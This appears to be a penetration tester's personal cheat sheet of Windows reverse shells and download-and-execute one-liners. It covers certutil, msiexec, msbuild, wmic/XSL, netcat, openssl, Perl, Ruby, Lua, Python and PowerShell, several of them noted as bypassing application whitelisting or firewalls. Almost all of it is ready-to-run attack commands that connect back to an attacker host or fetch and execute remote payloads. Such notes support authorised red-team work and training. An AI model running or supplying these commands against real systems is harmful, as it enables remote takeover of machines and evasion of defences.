---
id: Windows
aliases: []
tags:
  - Pentest/Shells/Reverse-Shell/Windows
---

# Windows

**Windows Reverse Shells**

<!-- Info {{{-->
> [!info]- Resources
>
> - [HackTricks](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)
> - [Revshells](https://www.revshells.com/)
> - [LOLBAS](https://lolbas-project.github.io/#)
>
<!-- }}} -->

___

<!-- Certutil {{{-->
## Certutil

<!-- Warning {{{-->
> [!warning]
>
>  Detected by Defender
>
<!-- }}} -->

Download a `B64dll`, decode and execute

```sh
certutil -urlcache -split -f http://<ip>/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

Download a `B64exe`, decode execute

```sh
certutil -urlcache -split -f http://<ip>/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

[Source](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

___
<!-- }}} -->

<!-- CSC {{{-->
## CSC

Compile C# code on the target machine

```sh
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```

[Download](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
a basic C# reverse shell from here

___
<!-- }}} -->

<!-- Lua {{{-->
## Lua

```sh
lua5.1 -e 'local host, port = "<attacker_ip>", <port> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

___
<!-- }}} -->

<!-- MSIExec {{{-->
## MSIExec

<!-- Warning {{{-->
> [!warning]
>
>  Detected by Defender
>
<!-- }}} -->

**Attacker**

```sh
msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=<port> -f msi > shell.msi
```

```sh
python -m SimpleHTTPServer 80
```

**Victim**

```sh
msiexec /quiet /i \\<attacker_ip>\kali\shell.msi
```

___
<!-- }}} -->

<!-- Nc {{{-->
## Nc

[[nc]]

```sh
nc.exe -e cmd.exe <attacker_ip> <port>
```

___
<!-- }}} -->

<!-- Msbuild {{{-->
## Msbuild

Use [this technique](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
to bypass Application Whitelisting and `Powershell.exe` restrictions
(*Prompting with a PS shell*)

```sh
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

Download and execute [MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)

```sh
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```

___
<!-- }}} -->

<!-- Netcat {{{-->
## Netcat

**Target**

Unencrypted

```sh
ncat.exe <attacker> <port>  -e "cmd.exe /c (cmd.exe  2>&1)"
```

Encrypted (*firewall bypass*)

```sh
ncat.exe <attacker_ip> 443 --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
```

**Attacker**

Unencrypted

```sh
ncat -lvnp <port>
```

Encrypted (*firewall bypass*)

```sh
ncat -lvnp <443> --ssl
```

___
<!-- }}} -->

<!-- OpenSSH {{{-->
## OpenSSH

**Attacker**

1. Generate certificate

```sh
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

2. Introduce the commands

```sh
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

3. Get the response

```sh
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2>
```

**Target**

```sh
openssl.exe s_client -quiet -connect <attacker_ip>:<port1>| \
cmd.exe| \
openssl s_client -quiet -connect <attacker_ip>:<port2>
```

<!-- }}} -->

<!-- Perl {{{-->
## Perl

```sh
perl -e 'use Socket;$i="<attacker_ip>-IP";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```sh
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<attacker_ip>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

___
<!-- }}} -->

<!-- PowerShell {{{-->
## PowerShell

[Nishang](https://github.com/samratashok/nishang/tree/master) â€”
Offensive PowerShell for red team,
penetration testing and offensive security

<!-- Example {{{-->
> [!example]-
>
> ```sh
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
> ```
<!-- }}} -->

**Fileless Execution**

- Process performing network call: `powershell.exe`
- No payload is written on disk

```sh
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
```
```sh
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
```
```sh
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
```
```sh
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```

**File-based Execution**

- Process performing network call: `svchost.exe`
- Payload written on disk (*WebDAV client local cache*)

```powershell
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

One liner

<!-- Example {{{-->
> [!example]-
>
> ```sh
> $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Python {{{-->
## Python

Python 2.7

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<attacker_ip>', <port>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
> ```
<!-- }}} -->


___
<!-- }}} -->

<!-- Ruby {{{-->
## Ruby

```sh
ruby -rsocket -e 'c=TCPSocket.new("[<attacker_ip>]","[<port>]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

___
<!-- }}} -->

<!-- SBD {{{-->
## SBD

[sbd](https://www.kali.org/tools/sbd/)
is a portable and secure Netcat alternative for Unix and Win32

**Target**

```sh
sbd -l -p <port> -e bash -v -n
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sbd -l -p 4444 -e bash -v -n
> ```
> ```sh
> listening on port 4444
> ```
>
<!-- }}} -->

**Attacker**

```sh
sbd $target <port>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sbd 10.10.10.10 4444
> ```
> ```sh
> id
> ```
> ```sh
> uid=0(root) gid=0(root) groups=0(root)
> ```
>
> <!-- }}} -->

___
<!-- }}} -->

<!-- Wmic {{{-->
## Wmic

```sh
wmic os get /format:"https://webserver/payload.xsl"
```

[Example XLS File](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

<!-- Example {{{-->
> [!example]-
>
> ```sh
> <?xml version='1.0'?>
> <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
> <output method="text"/>
>     <ms:script implements-prefix="user" language="JScript">
>         <![CDATA[
>             var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
>         ]]>
>     </ms:script>
> </stylesheet>
> ```
>
<!-- }}} -->

___
<!-- }}} -->
